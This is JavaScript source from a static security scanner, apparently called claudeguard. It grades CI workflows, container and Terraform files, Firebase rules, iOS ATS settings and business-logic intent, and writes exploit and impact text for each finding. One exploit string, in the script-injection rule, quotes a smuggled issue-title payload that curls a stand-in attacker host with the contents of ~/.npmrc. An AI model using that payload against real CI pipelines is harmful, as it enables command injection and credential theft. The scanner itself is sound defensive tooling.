    if (pl.allowsArbitraryLoads?.value === true) {
      const overridden = atsOverride.length > 0
      findings.push(finding({
        id: 'CG-IOS-001', subject,
        title_en: 'App Transport Security is disabled for all hosts',
        title_he: 'מנגנון App Transport Security מבוטל עבור כל השרתים',
        severity: 'P2', evidence: overridden ? 'weak' : 'definitive',
        why: overridden
          ? `NSAllowsArbitraryLoads is true, but ${atsOverride.join(' / ')} is also set, and iOS 10 and later ignore NSAllowsArbitraryLoads whenever one of those is present.`
          : 'NSAllowsArbitraryLoads is true, which turns off the platform requirement for HTTPS.',
        at: firstAt(pl.file, pl.allowsArbitraryLoads.line, 'NSAllowsArbitraryLoads'),
        exploit: 'Anyone on the same network reads and rewrites the app\'s traffic, including tokens.',
        impact: 'Account takeover and content tampering on any untrusted network.',
        guard: 'guard-recipes/ios-ats.md#arbitrary-loads',
        cwe: 'CWE-319', owasp: 'M3',
        assumption: overridden
          ? `That this target still deploys to iOS 9, where NSAllowsArbitraryLoads is honoured. On iOS 10 and later ${atsOverride.join(' / ')} governs instead and this key does nothing.`
          : pl.hasExceptionDomains
            ? 'That the NSExceptionDomains block does not already restrict this to hosts you control.'
            : null,
      }))
      problems.push(overridden
        ? `NSAllowsArbitraryLoads is set but ${atsOverride.join(' / ')} overrides it on iOS 10+`
        : 'ATS disabled globally')
    }

    // Not `else`: when both keys are set, the web-content key is the one iOS 10+ honours, so it is
    // the accurate statement about the app and must not be swallowed by the broader finding.
    if (pl.allowsArbitraryLoadsInWebContent?.value === true) {
      findings.push(finding({
        id: 'CG-IOS-002', subject,
        title_en: 'App Transport Security is disabled inside web views',
        title_he: 'מנגנון App Transport Security מבוטל בתוך תצוגות ווב',
        severity: 'P3', evidence: 'definitive',
        why: 'NSAllowsArbitraryLoadsInWebContent is true, so web views may load plaintext HTTP.',
        at: firstAt(pl.file, pl.allowsArbitraryLoadsInWebContent.line, 'NSAllowsArbitraryLoadsInWebContent'),
        exploit: 'Content loaded in a web view can be rewritten in transit and then runs in your app\'s context.',
        impact: 'Injected content inside the app, on any untrusted network.',
        guard: 'guard-recipes/ios-ats.md#web-content',
        cwe: 'CWE-319', owasp: 'M3',
      }))
      problems.push('ATS disabled for web content')
    }

    if (problems.length) { ledger.record('mobileArtifacts', subject, 'fail', problems.join(', ')); continue }

    // Per-domain `NSExceptionAllowsInsecureHTTPLoads` is a documented P2 in checks/ios.md when it
    // is broad, and "broad" is a judgement no rule here makes. Declared rather than passed over.
    if (pl.insecureHttpExceptions > 0) {
      ledger.record('mobileArtifacts', subject, 'undeterminable',
        `${pl.insecureHttpExceptions} NSExceptionDomains entr${pl.insecureHttpExceptions === 1 ? 'y allows' : 'ies allow'} insecure HTTP loads — open the block and confirm each host is one you control and genuinely cannot serve HTTPS`)
      continue
    }

    // ATS is on by default, so a plist that never weakens it is structurally correct.
    ledger.record('mobileArtifacts', subject, 'pass',
      pl.hasAtsBlock ? 'ATS present and not globally disabled' : 'ATS left at the secure platform default')
  }
}

// ---------------------------------------------------------------------------
// CI/CD, infrastructure as code, and Firebase rules
//
// AUDIT FIX C. These three domains were DISCOVERED by the engine and graded by nothing, which is
// the mobile defect repeating: a workflow that hands repo secrets to a forked pull request, a
// Dockerfile with a baked live key, and `allow read, write: if true` on a Firestore database all
// produced exactly the same report as a repo that had none of them — a clean one.
//
// The rule the whole fix is built on: GRADE OR DECLARE. Every artifact class the engine can see
// either gets a rule that walks it, or gets a row in the ledger saying it was seen and not graded.
// Silence is the one thing it may never produce, because a reader cannot tell silence from safety.
// ---------------------------------------------------------------------------

function gradeCiWorkflows(model, ledger, findings, allow) {
  ledger.declare('ciWorkflows')
  // A trigger a fork can fire. `pull_request` gets no secrets and no write token, so it is safe by
  // design; these three run with the base repository's permissions.
  const FORK_REACHABLE = new Set(['pull_request_target', 'workflow_run', 'issue_comment'])

  for (const w of model.ci || []) {
    const subject = `workflow:${w.file}`
    if (allow.has(subject)) { ledger.record('ciWorkflows', subject, 'allowlisted', 'user allowlist'); continue }
    const problems = []

    if (w.untrustedCheckout && w.triggers.includes('pull_request_target')) {
      // The most dangerous shape in GitHub Actions, and it is entirely readable from the file:
      // `pull_request_target` grants the workflow the base repo's secrets and a write token, and
      // the checkout replaces the code with the fork's. Anything that runs afterwards is the
      // attacker's code holding your credentials — `npm ci` alone suffices, because an install
      // script in their package.json runs at that moment.
      findings.push(finding({
        id: 'CG-CI-001', subject,
        title_en: 'Workflow runs code from a forked pull request with your secrets',
        title_he: 'תהליך העבודה מריץ קוד מבקשת משיכה חיצונית עם הסודות שלכם',
        severity: 'P0',
        evidence: w.executesAfterCheckout ? 'definitive' : 'strong',
        why: w.executesAfterCheckout
          ? `The workflow triggers on pull_request_target, checks out ${w.untrustedCheckout.ref}, and then executes steps — so a fork's code runs with this repository's secrets.`
          : `The workflow triggers on pull_request_target and checks out ${w.untrustedCheckout.ref}; no execution step was identified after it, but the untrusted code is now on disk.`,
        at: firstAt(w.file, w.untrustedCheckout.line, w.untrustedCheckout.ref),
        exploit: 'Anyone opens a pull request from a fork. Their code runs on your runner and can print, exfiltrate, or use every secret the workflow can read.',
        impact: 'Every secret in this repository must be considered readable by any stranger who can open a PR — deploy keys, cloud credentials, npm tokens.',
        guard: 'guard-recipes/ci-hardening.md#pull-request-target',
        cwe: 'CWE-829', owasp: 'A08:2021',
        assumption: w.executesAfterCheckout ? null : 'That no later step executes the checked-out code.',
      }))
      problems.push('untrusted checkout under pull_request_target')
    }

    for (const inj of w.scriptInjections) {
      findings.push(finding({
        id: 'CG-CI-002', subject,
        title_en: `Attacker-controlled text is interpolated into a shell command (${inj.expr})`,
        title_he: `טקסט בשליטת תוקף מוטמע בפקודת מעטפת (${inj.expr})`,
        severity: 'P1', evidence: 'definitive',
        why: `\${{ ${inj.expr} }} is substituted into the run: script BEFORE the shell parses it, so its contents become part of the command.`,
        at: firstAt(w.file, inj.line, `\${{ ${inj.expr} }}`),
        exploit: 'Someone opens an issue titled `a"; curl attacker.site/$(cat $HOME/.npmrc); #` and the runner executes it.',
        impact: 'Arbitrary commands on your runner, with whatever secrets that job can read.',
        guard: 'guard-recipes/ci-hardening.md#script-injection',
        cwe: 'CWE-78', owasp: 'A03:2021', autofixable: true,
      }))
      problems.push(`script injection via ${inj.expr}`)
    }

    // Only third-party actions. A movable tag is a real risk everywhere, but the attack that keeps
    // happening is a compromised independent maintainer — and reporting `actions/checkout@v4` in
    // every repository on earth would train people to skim past this whole section.
    const thirdPartyUnpinned = w.unpinnedActions.filter(a => !a.firstParty)
    if (thirdPartyUnpinned.length) {
      const a = thirdPartyUnpinned[0]
      findings.push(finding({
        id: 'CG-CI-003', subject,
        title_en: `Third-party action "${a.action}" is used by a movable tag`,
        title_he: `הפעולה החיצונית "${a.action}" משמשת דרך תגית שניתן להזיז`,
        severity: 'P2', evidence: 'definitive',
        why: `\`uses: ${a.action}@${a.ref}\` resolves a tag or branch at run time, and whoever owns that repository can point it at different code without any change here.`,
        at: firstAt(w.file, a.line, `uses: ${a.action}@${a.ref}`),
        exploit: 'The action\'s maintainer is compromised, the tag is repointed, and your next CI run executes their code with your secrets.',
        impact: 'Full compromise of the workflow: its secrets, its token, and anything it deploys.',
        guard: 'guard-recipes/ci-hardening.md#pin-actions',
        cwe: 'CWE-829', owasp: 'A08:2021',
        assumption: `That this action's owner is outside your control. ${thirdPartyUnpinned.length} unpinned third-party action(s) in this workflow.`,
      }))
      problems.push(`${thirdPartyUnpinned.length} unpinned third-party action(s)`)
    }

    if (w.selfHosted && w.triggers.some(t => FORK_REACHABLE.has(t) || t === 'pull_request')) {
      findings.push(finding({
        id: 'CG-CI-004', subject,
        title_en: 'A self-hosted runner is reachable from a fork-triggered workflow',
        title_he: 'ראנר בשרת עצמי נגיש מתהליך שמופעל על ידי מאגר מפוצל',
        severity: 'P1', evidence: 'strong',
        why: `runs-on names a self-hosted runner and this workflow triggers on ${w.triggers.join(', ')}, which a fork can fire.`,
        at: firstAt(w.file, w.selfHosted.line),
        exploit: 'An attacker opens a pull request; their code runs on your machine, which is not destroyed afterwards.',
        impact: 'Code execution on hardware you own, plus persistence into later jobs on the same runner.',
        guard: 'guard-recipes/ci-hardening.md#self-hosted',
        cwe: 'CWE-269',
        assumption: 'That this repository accepts pull requests from forks, and that the runner is not ephemeral.',
      }))
      problems.push('self-hosted runner on a fork-reachable trigger')
    }

    if (!w.declaresPermissions && !w.declaresJobPermissions) {
      // Deliberately weak evidence: the effective default is an ORG/REPO setting we cannot read
      // from the repository. New repositories default to read-only; older ones are still write-all.
      findings.push(finding({
        id: 'CG-CI-005', subject,
        title_en: 'Workflow declares no `permissions:` block',
        title_he: 'תהליך העבודה אינו מגדיר בלוק `permissions:`',
        severity: 'P3', evidence: 'weak',
        why: 'No permissions block is declared, so the GITHUB_TOKEN scope comes from a repository or organisation default that cannot be read from this repo.',
        at: firstAt(w.file),
        exploit: 'If the default is write-all, any step — including a compromised action — can push commits, edit releases, or open a pull request as the repository.',
        impact: 'Depends on a setting outside this file. Declaring the block makes it depend on the file instead.',
        guard: 'guard-recipes/ci-hardening.md#least-privilege-token',
        cwe: 'CWE-269', autofixable: true,
        assumption: 'That the repository default is not already read-only, which newer GitHub defaults set.',
      }))
      problems.push('no permissions block')
    }

    for (const s of w.secretsInRunScript) {
      findings.push(finding({
        id: 'CG-CI-006', subject,
        title_en: 'A secret is interpolated directly into a shell script',
        title_he: 'סוד מוטמע ישירות בסקריפט מעטפת',
        severity: 'P3', evidence: 'weak',
        why: 'A `${{ secrets.* }}` expression is substituted into a run: script rather than passed through `env:`.',
        at: firstAt(w.file, s.line),
        exploit: 'Actions redacts exact secret values from logs, but not transformed ones — a `base64`, `cut` or `jq` of the value prints in the clear.',
        impact: 'A secret readable in a public build log, which is indexed and archived.',
        guard: 'guard-recipes/ci-hardening.md#least-privilege-token',
        cwe: 'CWE-532',
        assumption: 'That the script transforms or forwards the value rather than only passing it to a tool that handles it safely.',
      }))
      problems.push('secret interpolated into a run script')
    }

    ledger.record('ciWorkflows', subject, problems.length ? 'fail' : 'pass',
      problems.length
        ? problems.join('; ')
        : `${w.actionsTotal} action(s), permissions declared, no fork-reachable execution of untrusted code`)
  }
}

function gradeIac(model, ledger, findings, allow) {
  ledger.declare('iacFiles')
  const iac = model.iac || {}

  for (const d of iac.dockerfiles || []) {
    const subject = `dockerfile:${d.file}`
    if (allow.has(subject)) { ledger.record('iacFiles', subject, 'allowlisted', 'user allowlist'); continue }
    const problems = []

    for (const s of d.bakedSecrets) {
      // A NAME plus a real VALUE in a committed file. The value is what lifts this past LAW 3 for
      // the high-confidence tier; a credential-shaped name alone stays at P2 with nameOnly set.
      const high = s.secretClass === 'high'
      findings.push(finding({
        id: 'CG-IAC-001', subject,
        title_en: `Secret "${s.name}" is baked into the image`,
        title_he: `הסוד "${s.name}" מוטמע בתוך האימג'`,
        severity: high ? 'P0' : 'P2',
        evidence: high ? 'definitive' : 'weak', nameOnly: !high,
        why: `${s.directive} assigns a literal value to ${s.name}, which is stored in the image layer and readable with \`docker history\`.`,
        at: firstAt(d.file, s.line, `${s.directive} ${s.name}=…`),
        exploit: 'Anyone who can pull the image reads the value. Deleting the line in a later layer does not remove it.',
        impact: high
          ? 'Whatever the credential grants, to anyone with the image or the repository. Rotate it — it is in every build you pushed.'
          : 'Depends on the value. If it grants access, rotate it; if it is a public identifier, allowlist it.',
        guard: 'guard-recipes/container-iac.md#no-baked-secrets',
        cwe: 'CWE-798', owasp: 'A05:2021',
        assumption: high ? 'That the value is live. Rotate regardless — it is in the image history.' : 'That this value grants privileged access rather than being a public identifier.',
      }))
      problems.push(`baked secret ${s.name}`)
    }

    if (!d.setsUser) {
      findings.push(finding({
        id: 'CG-IAC-002', subject,
        title_en: 'Container runs as root',
        title_he: 'הקונטיינר רץ כמשתמש root',
        severity: 'P3', evidence: 'definitive',
        why: 'The Dockerfile declares no non-root USER, so every process in the container runs as uid 0.',
        at: firstAt(d.file, d.baseImage?.line ?? null),
        exploit: 'Any code-execution bug in the app becomes root inside the container, which is the first half of a container escape.',
        impact: 'Turns a contained bug into a host-level one. On its own it breaks nothing.',
        guard: 'guard-recipes/container-iac.md#run-as-non-root',
        cwe: 'CWE-250', autofixable: true,
      }))
      problems.push('no USER directive')
    }

    if (d.remoteScript) {
      findings.push(finding({
        id: 'CG-IAC-003', subject,
        title_en: 'Build pipes a remote script straight into a shell',
        title_he: 'תהליך הבנייה מריץ סקריפט מרוחק ישירות במעטפת',
        severity: 'P2', evidence: 'definitive',
        why: 'A RUN step fetches a script over the network and executes it, with no checksum and no pinned version.',
        at: firstAt(d.file, d.remoteScript.line),
        exploit: 'Whoever controls that URL — or anyone who can intercept it — chooses what runs inside your build.',
        impact: 'Arbitrary code in every image you build, including your production one.',
        guard: 'guard-recipes/container-iac.md#pin-base-images',
        cwe: 'CWE-494', owasp: 'A08:2021',
      }))
      problems.push('curl | sh in build')
    }

    if (d.baseImage && !d.baseImage.pinned && d.baseImage.latest) {
      findings.push(finding({
        id: 'CG-IAC-004', subject,
        title_en: `Base image "${d.baseImage.ref}" is unpinned`,
        title_he: `אימג' הבסיס "${d.baseImage.ref}" אינו מקובע`,
        severity: 'P3', evidence: 'definitive',
        why: 'The FROM line names a floating tag rather than a digest, so two builds of the same commit can produce different images.',
        at: firstAt(d.file, d.baseImage.line, `FROM ${d.baseImage.ref}`),
        exploit: 'A moved or compromised upstream tag lands in your next deploy with no change on your side.',
        impact: 'Unreproducible builds, and an upstream supply-chain change you never approved.',
        guard: 'guard-recipes/container-iac.md#pin-base-images',
        cwe: 'CWE-1104',
      }))
      problems.push('unpinned base image')
    }

    ledger.record('iacFiles', subject, problems.length ? 'fail' : 'pass',
      problems.length ? problems.join(', ') : 'non-root user, pinned base, no baked secrets')
  }

  for (const c of iac.compose || []) {
    const subject = `compose:${c.file}`
    if (allow.has(subject)) { ledger.record('iacFiles', subject, 'allowlisted', 'user allowlist'); continue }
    const problems = []

    if (c.dockerSocket) {
      findings.push(finding({
        id: 'CG-IAC-005', subject,
        title_en: 'The Docker socket is mounted into a container',
        title_he: 'שקע ה-Docker מחובר לתוך קונטיינר',
        severity: 'P1', evidence: 'definitive',
        why: '/var/run/docker.sock is bind-mounted, which gives the container full control of the Docker daemon.',
        at: firstAt(c.file, c.dockerSocket.line, '/var/run/docker.sock'),
        exploit: 'Anything running in that container starts a new privileged container mounting the host filesystem — that is host root, by design.',
        impact: 'The container boundary does not exist for this service.',
        guard: 'guard-recipes/container-iac.md#compose-exposure',
        cwe: 'CWE-250',
      }))
      problems.push('docker socket mounted')
    }
    if (c.privileged) {
      findings.push(finding({
        id: 'CG-IAC-006', subject,
        title_en: 'A service runs privileged',
        title_he: 'שירות רץ במצב privileged',
        severity: 'P1', evidence: 'definitive',
        why: '`privileged: true` disables nearly every isolation feature the container runtime provides.',
        at: firstAt(c.file, c.privileged.line, 'privileged: true'),
        exploit: 'A process in the container reaches host devices and kernel interfaces directly.',
        impact: 'Container escape becomes straightforward rather than a chain of bugs.',
        guard: 'guard-recipes/container-iac.md#compose-exposure',
        cwe: 'CWE-250',
      }))
      problems.push('privileged service')
    }
    for (const p of c.exposedDbPorts) {
      findings.push(finding({
        id: 'CG-IAC-007', subject,
        title_en: `${p.service} port ${p.port} is published to every interface`,
        title_he: `הפורט ${p.port} של ${p.service} נחשף לכל הממשקים`,
        severity: 'P1', evidence: 'definitive',
        why: `The ports mapping binds ${p.bind}, so the database listens on every interface of the host rather than only on the compose network.`,
        at: firstAt(c.file, p.line, `${p.port}:${p.port}`),
        exploit: 'Anyone who can reach the host connects to the database directly, bypassing your application entirely.',
        impact: 'On a host without a firewall this is the open internet — the usual route to an unauthenticated database in a ransom note.',
        guard: 'guard-recipes/container-iac.md#compose-exposure',
        cwe: 'CWE-668', owasp: 'A05:2021', autofixable: true,
        assumption: 'That this compose file is used somewhere reachable rather than only on a developer laptop.',
      }))
      problems.push(`${p.service} published on ${p.bind}`)
    }
    for (const s of c.bakedSecrets) {
      const high = s.secretClass === 'high'
      findings.push(finding({
        id: 'CG-IAC-008', subject,
        title_en: `Secret "${s.name}" is written into the compose file`,
        title_he: `הסוד "${s.name}" כתוב בתוך קובץ ה-compose`,
        severity: high ? 'P1' : 'P2',
        evidence: high ? 'definitive' : 'weak', nameOnly: !high,
        why: `${s.name} is assigned a literal value in a file that is committed to the repository.`,
        at: firstAt(c.file, s.line, `${s.name}=…`),
        exploit: 'Anyone who can read the repository reads the value.',
        impact: high ? 'Whatever the credential grants. Rotate it and move the value to an env file that is not committed.' : 'Depends on the value.',
        guard: 'guard-recipes/container-iac.md#no-baked-secrets',
        cwe: 'CWE-798',
        assumption: high ? 'That the value is live rather than a local development placeholder.' : 'That this value grants privileged access.',
      }))
      problems.push(`literal ${s.name}`)
    }
    if (c.hostNetwork) {
      findings.push(finding({
        id: 'CG-IAC-009', subject,
        title_en: 'A service uses the host network directly',
        title_he: 'שירות משתמש ישירות ברשת המארח',
        severity: 'P2', evidence: 'definitive',
        why: '`network_mode: host` removes network namespacing, so the container shares the host\'s interfaces and every port it opens is a host port.',
        at: firstAt(c.file, c.hostNetwork.line, 'network_mode: host'),
        exploit: 'Every port the service binds is exposed wherever the host is reachable, and the container can reach host-local services meant to be private.',
        impact: 'Port-level isolation between the container and the host is gone.',
        guard: 'guard-recipes/container-iac.md#compose-exposure',
        cwe: 'CWE-668',
      }))
      problems.push('host network mode')
    }

    ledger.record('iacFiles', subject, problems.length ? 'fail' : 'pass',
      problems.length ? problems.join(', ') : 'no privileged service, socket mount, or published database port')
  }

  for (const t of iac.terraform || []) {
    const subject = `terraform:${t.file}`
    if (allow.has(subject)) { ledger.record('iacFiles', subject, 'allowlisted', 'user allowlist'); continue }
    const problems = []

    for (const ing of t.openIngress) {
      findings.push(finding({
        id: 'CG-IAC-010', subject,
        title_en: `Ingress from 0.0.0.0/0 on ports ${ing.portRange}`,
        title_he: `תעבורה נכנסת מ-0.0.0.0/0 בפורטים ${ing.portRange}`,
        severity: 'P1', evidence: 'definitive',
        why: `A rule allows 0.0.0.0/0 on ${ing.portRange}. Public 80/443 is excluded by this rule as normal for a web server; this range is not.`,
        at: firstAt(t.file, ing.line, '0.0.0.0/0'),
        exploit: 'Anyone on the internet connects to that port directly — a database, an admin panel, or SSH.',
        impact: 'The service is exposed to untargeted internet-wide scanning, which finds it within hours.',
        guard: 'guard-recipes/container-iac.md#terraform-network',
        cwe: 'CWE-284', owasp: 'A01:2021',
        assumption: 'That this rule is applied to a resource that is actually deployed, and that the port range is not fronted by something that authenticates.',
      }))
      problems.push(`open ingress ${ing.portRange}`)
    }
    if (t.publicAcl) {
      findings.push(finding({
        id: 'CG-IAC-011', subject,
        title_en: 'Object storage is configured with a public ACL',
        title_he: 'אחסון האובייקטים מוגדר עם הרשאת גישה ציבורית',
        severity: 'P1', evidence: 'definitive',
        why: `The configuration sets ${t.publicAcl.match}, which makes the bucket's objects readable without credentials.`,
        at: firstAt(t.file, t.publicAcl.line, t.publicAcl.match),
        exploit: 'Anyone who learns or guesses the bucket name lists and downloads its contents.',
        impact: 'Everything in the bucket is public, including anything a user uploaded expecting privacy.',
        guard: 'guard-recipes/container-iac.md#terraform-network',
        cwe: 'CWE-284', owasp: 'A01:2021',
        assumption: 'That the bucket holds anything not intended for the public. A CDN asset bucket is a legitimate use — allowlist it.',
      }))
      problems.push('public bucket ACL')
    }
    if (t.publiclyAccessible) {
      findings.push(finding({
        id: 'CG-IAC-012', subject,
        title_en: 'A managed database is marked publicly accessible',
        title_he: 'מסד נתונים מנוהל מסומן כנגיש לציבור',
        severity: 'P1', evidence: 'definitive',
        why: '`publicly_accessible = true` gives the instance a public endpoint, so its exposure depends entirely on the security group.',
        at: firstAt(t.file, t.publiclyAccessible.line, t.publiclyAccessible.match),
        exploit: 'The database answers from the internet; only the security group stands between it and a scanner.',
        impact: 'One over-broad rule away from a fully exposed database.',
        guard: 'guard-recipes/container-iac.md#terraform-network',
        cwe: 'CWE-668',
      }))
      problems.push('publicly accessible database')
    }
    for (const s of t.literalSecrets) {
      findings.push(finding({
        id: 'CG-IAC-013', subject,
        title_en: `Credential "${s.name}" is hardcoded in Terraform`,
        title_he: `פרטי ההזדהות "${s.name}" כתובים ישירות בקוד ה-Terraform`,
        severity: 'P1', evidence: 'strong',
        why: `${s.name} is assigned a string literal rather than a variable or a secret-manager reference.`,
        at: firstAt(t.file, s.line, `${s.name} = "…"`),
        exploit: 'Anyone who can read the repository reads the credential, and it is also copied into the state file.',
        impact: 'Whatever the credential grants. Rotate it and move it to a secret manager.',
        guard: 'guard-recipes/container-iac.md#no-baked-secrets',
        cwe: 'CWE-798', owasp: 'A05:2021',
        assumption: 'That the literal is a live credential rather than a placeholder for a local run.',
      }))
      problems.push(`hardcoded ${s.name}`)
    }

    ledger.record('iacFiles', subject, problems.length ? 'fail' : 'pass',
      problems.length ? problems.join(', ') : 'no world-open ingress, public storage, or hardcoded credential')
  }

  for (const f of iac.stateFiles || []) {
    const subject = `terraform-state:${f}`
    if (allow.has(subject)) { ledger.record('iacFiles', subject, 'allowlisted', 'user allowlist'); continue }
    findings.push(finding({
      id: 'CG-IAC-014', subject,
      title_en: 'A Terraform state file is committed to the repository',
      title_he: 'קובץ מצב של Terraform נשמר במאגר',
      severity: 'P0', evidence: 'definitive',
      why: 'State records every attribute of every resource in plaintext, including generated passwords, private keys and connection strings.',
      at: firstAt(f),
      exploit: 'Anyone who can read the repository — or its history — opens the file and reads the credentials directly.',
      impact: 'Every secret your infrastructure generated is disclosed. No scanner rule catches these, because the values have no recognisable prefix.',
      guard: 'guard-recipes/container-iac.md#terraform-state',
      cwe: 'CWE-538', owasp: 'A05:2021',
      assumption: 'That the state describes real infrastructure rather than a throwaway local example.',
    }))
    ledger.record('iacFiles', subject, 'fail', 'state file committed')
  }
}

function gradeFirebaseRules(model, ledger, findings, allow) {
  ledger.declare('firebaseRules')
  for (const r of model.firebaseRules || []) {
    const subject = `firebase-rules:${r.file}`
    if (allow.has(subject)) { ledger.record('firebaseRules', subject, 'allowlisted', 'user allowlist'); continue }

    if (r.openRules.length) {
      const o = r.openRules[0]
      const ops = (o.ops || []).join(', ') || 'read, write'
      const writable = /write|create|update|delete/.test(ops)
      findings.push(finding({
        id: 'CG-FB-001', subject,
        title_en: `Firebase rules allow ${ops} to anyone`,
        title_he: `כללי Firebase מתירים ${ops} לכל אחד`,
        severity: 'P0', evidence: 'definitive',
        why: `A rule grants \`${ops}\` with the condition \`true\`, which every request satisfies — including one with no account at all.`,
        at: firstAt(r.file, o.line, `allow ${ops}: if true`),
        exploit: 'The Firebase config object ships in your client bundle by design. Anyone reads it out of DevTools and queries the database directly with the SDK.',
        impact: writable
          ? 'Anyone can read, modify and delete everything this rule covers. This is the Firebase equivalent of running with no access control at all.'
          : 'Everything this rule covers is world-readable, including anything a user uploaded expecting privacy.',
        guard: 'guard-recipes/firebase-rules.md#owner-scoped',
        cwe: 'CWE-284', owasp: 'A01:2021', autofixable: false,
        assumption: 'That this path holds anything not intended to be public. A deliberately public collection is a legitimate use — allowlist it.',
      }))
      ledger.record('firebaseRules', subject, 'fail', `${r.openRules.length} rule(s) with an unconditional \`true\``)
      continue
    }

    if (r.authOnlyRules.length) {
      const o = r.authOnlyRules[0]
      const ops = (o.ops || []).join(', ') || 'read, write'
      findings.push(finding({
        id: 'CG-FB-002', subject,
        title_en: `Firebase rules grant ${ops} to any signed-in user`,
        title_he: `כללי Firebase מעניקים ${ops} לכל משתמש מחובר`,
        severity: 'P1', evidence: 'definitive',
        why: '`request.auth != null` checks that the caller is signed in, and nothing else. It is not compared against any field on the document, so it does not scope anything.',
        at: firstAt(r.file, o.line, `allow ${ops}: if request.auth != null`),
        exploit: 'An attacker signs up through your own sign-up form — that takes seconds — and then reads or writes every other user\'s documents.',
        impact: 'A cross-tenant leak: every customer\'s data is available to every other customer.',
        guard: 'guard-recipes/firebase-rules.md#any-authenticated',
        cwe: 'CWE-639', owasp: 'A01:2021',
        assumption: 'That the documents under this path are per-user rather than genuinely shared between all signed-in users.',
      }))
      ledger.record('firebaseRules', subject, 'fail', `${r.authOnlyRules.length} rule(s) scoped only to "any signed-in user"`)
      continue
    }

    // Structural pass: every allow rule in the file carries a condition that is neither `true` nor
    // the bare signed-in check. What those conditions actually compare is not verified here — the
    // auditors read them — so this is a pass on the two catastrophic shapes, not on the rules.
    ledger.record('firebaseRules', subject, 'pass',
      `${r.dialect} rules: no unconditional or signed-in-only grant`)
  }
}

// ---------------------------------------------------------------------------
// Business logic — the one tier that cannot be proven, only reviewed.
//
// Every other rule asks a question the code answers by itself: is RLS on, is the key behind a public
// prefix, does this handler compare a column. This one asks what the app is SUPPOSED to permit, and
// the code cannot say. "User A can read user B's order" is a critical bug in a store and a
// deliberate feature in an admin console — byte-identical code, opposite verdicts.
//
// So this layer never proves anything. It checks code against a STATED intent, and every finding it
// makes is a reviewer's lead: `judgement` evidence, `reviewer` provenance, capped at `likely`, and
// therefore unable to move the verdict, which counts only `confirmed`. The assertion under
// OBSERVATION_POLICY enforces that at module load so a later edit cannot quietly promote a guess
// about business rules into a certainty.
// ---------------------------------------------------------------------------
function gradeBusinessLogic(model, ledger, findings, allow, opts) {
  const audit = auditBusinessLogic(model, {
    intent: opts.intent ?? null,
    intentError: opts.intentError ?? null,
  })

  ledger.declare('businessLogic')
  ledger.declare('businessLogicScope')

  const emit = o => {
    const p = OBSERVATION_POLICY[o.kind]
    // A kind with no policy is a wiring bug, not a finding. Declaring it keeps the arithmetic exact
    // and makes the gap visible instead of dropping the observation on the floor.
    if (!p) {
      ledger.record('businessLogic', o.subject, 'undeterminable', `no policy owns business-logic kind "${o.kind}"`)
      return
    }
    findings.push(finding({
      id: p.id, subject: o.subject,
      title_en: p.title_en, title_he: p.title_he,
      severity: p.sev, evidence: p.evidence, provenance: p.provenance,
      why: o.detail || p.title_en,
      at: Array.isArray(o.at) ? o.at : [],
      exploit: p.exploit, impact: p.impact, guard: p.guard,
      cwe: p.cwe || null, owasp: p.owasp || null,
      tier: 'business-logic', autofixable: false,
      assumption: p.assumption || null,
    }))
  }

  // Which handler touches which resource. Declared per route, because attributing a `.from('orders')`
  // to one of twelve handlers sharing a file by proximity would be a guess wearing a fact's clothes.
  for (const row of audit.scope) ledger.record('businessLogicScope', row.subject, row.disposition, row.note)

  // The three classes no fact supports, the intent's free-form prose rules, resources the intent
  // names that do not exist, and tables the intent says nothing about.
  for (const row of [...audit.global, ...audit.extra]) {
    ledger.record('businessLogic', row.subject, row.disposition, row.note)
  }

  const observed = new Map(audit.observations.map(o => [o.subject, o]))

  for (const r of audit.resources) {
    for (const c of r.classes) {
      const subject = `bl:${r.resource}:${c.class}`
      if (allow.has(subject)) {
        ledger.record('businessLogic', subject, 'allowlisted', 'user allowlist')
        continue
      }
      ledger.record('businessLogic', subject, c.disposition, c.note)
      const o = observed.get(subject)
      if (o) emit(o)
    }
  }

  // An unconfirmed intent is a COVERAGE LIMITATION, never a finding — and this is the one place the
  // distinction earns its keep. Emitting it as a finding put `CG-BIZ-010 P2` on every repository
  // that has no claudeguard.intent.yml, which is every repository on its first run: the tool would
  // have reported a security finding because the user had not configured it yet. Nothing about the
  // app is wrong; something about our knowledge of it is, and that belongs in the coverage table.
  //
  // It is still recorded loudly. `businessLogic.status`, the assumptions list and the proposed
  // intent file all travel in the report, so the section cannot be mistaken for a confirmed clean
  // result — it just does not manufacture a P-level for a missing config file.
  const banner = audit.observations.find(o => o.kind === 'bl-intent-unconfirmed')
  if (banner) {
    ledger.record('businessLogic', banner.subject, 'undeterminable',
      audit.error
        ? `claudeguard.intent.yml could not be read (${audit.error}), so it was ignored entirely and every ownership model below was assumed from column names`
        : 'no claudeguard.intent.yml was provided, so every ownership model below was assumed from column names rather than confirmed by the author')
  }

  return audit
}

/**
 * GRADE OR DECLARE — the safety net.
 *
 * Every rule above walks a subject set. This walks what is LEFT: artifact classes the engine
 * discovered and no rule owns, plus enumeration gaps the engine reported. Without it, adding a new
 * artifact type to the engine silently widens the blind spot, because a class with no rule produces
 * no rows and a reader cannot tell an unexamined domain from a clean one.
 *
 * Everything here is `undeterminable` on purpose. That is the honest disposition for "we saw this
 * and did not grade it", and it puts the row in the same coverage table as everything else.
 */
function declareUngradedSurfaces(model, ledger) {
  ledger.declare('ungradedSurfaces')
  const a = model.artifacts || {}

  // Electron main-process files. `nodeIntegration: true` / `contextIsolation: false` are readable
  // facts, but no rule reads them yet, so the class is declared rather than left silent.
  for (const f of a.electronMain || []) {
    ledger.record('ungradedSurfaces', `electron:${f}`, 'undeterminable',
      'this file configures an Electron BrowserWindow; the static tier does not grade nodeIntegration / contextIsolation / webSecurity yet — review it against guard-recipes/electron-hardening.md')
  }

  // A server framework that declares no routes we could find. The `routes` set would otherwise
  // report a confident 0.
  for (const gap of model.discovery?.routes?.frameworkGaps || []) {
    ledger.record('ungradedSurfaces', `route-framework:${gap.framework}`, 'undeterminable', gap.reason)
  }

  // Kubernetes manifests. The engine identifies them by content but has no rules for them, so a
  // repository whose entire deployment lives in Kubernetes must not read as fully examined.
  for (const f of model.iac?.k8sManifests || []) {
    ledger.record('ungradedSurfaces', `k8s:${f}`, 'undeterminable',
      'this is a Kubernetes manifest; the static tier does not grade privileged securityContexts, hostPath mounts, or secrets held in a manifest — review it against guard-recipes/container-iac.md')
  }

  // A mobile framework declared with zero manifests and zero plists enumerated. This is the modal
  // shape for this audience — a managed Expo app has no `android/` or `ios/` directory at all —
  // and every mobile subject set reported a confident 0, which the report renders as
  // `mobileArtifacts | 0 | 0 | 0 | 0 | 0`: indistinguishable from "there is no mobile surface".
